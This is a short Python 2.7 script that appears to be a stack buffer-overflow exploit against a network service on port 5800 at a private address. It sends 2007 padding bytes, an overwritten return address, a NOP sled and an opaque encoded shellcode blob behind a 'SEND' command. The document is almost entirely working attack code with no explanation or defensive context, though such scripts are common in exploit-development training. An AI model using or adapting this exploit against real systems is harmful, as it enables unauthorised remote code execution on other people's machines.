#!/usr/bin/python2.7
import socket
# jmp address - 625012A0
# bad char = \x00
IP = "10.1.1.1"
PORT = 5800
shell_code = ("\xdb\xd7\xbf\xe6\xd8\xfc\xf1\xd9\x74\x24\xf4\x5b\x33\xc9"
"\xb1\x52\x31\x7b\x17\x83\xeb\xfc\x03\x9d\xcb\x1e\x04\x9d"
"\x04\x5c\xe7\x5d\xd5\x01\x61\xb8\xe4\x01\x15\xc9\x57\xb2"
"\x5d\x9f\x5b\x39\x33\x0b\xef\x4f\x9c\x3c\x58\xe5\xfa\x73"
"\x59\x56\x3e\x12\xd9\xa5\x13\xf4\xe0\x65\x66\xf5\x25\x9b"
"\x8b\xa7\xfe\xd7\x3e\x57\x8a\xa2\x82\xdc\xc0\x23\x83\x01"
"\x90\x42\xa2\x94\xaa\x1c\x64\x17\x7e\x15\x2d\x0f\x63\x10"
"\xe7\xa4\x57\xee\xf6\x6c\xa6\x0f\x54\x51\x06\xe2\xa4\x96"
"\xa1\x1d\xd3\xee\xd1\xa0\xe4\x35\xab\x7e\x60\xad\x0b\xf4"
"\xd2\x09\xad\xd9\x85\xda\xa1\x96\xc2\x84\xa5\x29\x06\xbf"
"\xd2\xa2\xa9\x6f\x53\xf0\x8d\xab\x3f\xa2\xac\xea\xe5\x05"
"\xd0\xec\x45\xf9\x74\x67\x6b\xee\x04\x2a\xe4\xc3\x24\xd4"
"\xf4\x4b\x3e\xa7\xc6\xd4\x94\x2f\x6b\x9c\x32\xa8\x8c\xb7"
"\x83\x26\x73\x38\xf4\x6f\xb0\x6c\xa4\x07\x11\x0d\x2f\xd7"
"\x9e\xd8\xe0\x87\x30\xb3\x40\x77\xf1\x63\x29\x9d\xfe\x5c"
"\x49\x9e\xd4\xf4\xe0\x65\xbf\xf0\xf5\x64\x3d\x6d\xf4\x66"
"\x40\xd6\x71\x80\x28\x38\xd4\x1b\xc5\xa1\x7d\xd7\x74\x2d"
"\xa8\x92\xb7\xa5\x5f\x63\x79\x4e\x15\x77\xee\xbe\x60\x25"
"\xb9\xc1\x5e\x41\x25\x53\x05\x91\x20\x48\x92\xc6\x65\xbe"
"\xeb\x82\x9b\x99\x45\xb0\x61\x7f\xad\x70\xbe\xbc\x30\x79"
"\x33\xf8\x16\x69\x8d\x01\x13\xdd\x41\x54\xcd\x8b\x27\x0e"
"\xbf\x65\xfe\xfd\x69\xe1\x87\xcd\xa9\x77\x88\x1b\x5c\x97"
"\x39\xf2\x19\xa8\xf6\x92\xad\xd1\xea\x02\x51\x08\xaf\x23"
"\xb0\x98\xda\xcb\x6d\x49\x67\x96\x8d\xa4\xa4\xaf\x0d\x4c"
"\x55\x54\x0d\x25\x50\x10\x89\xd6\x28\x09\x7c\xd8\x9f\x2a"
"\x55")

if __name__ == "__main__":

    payload = "A" * 2007 + "\xa0\x12\x50\x62" + "\x90" * 32 + shell_code

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, PORT))
    s.recv(1024)
    print("Sending payload...")
    s.send("SEND "+ payload + "\r\n")
    s.close()
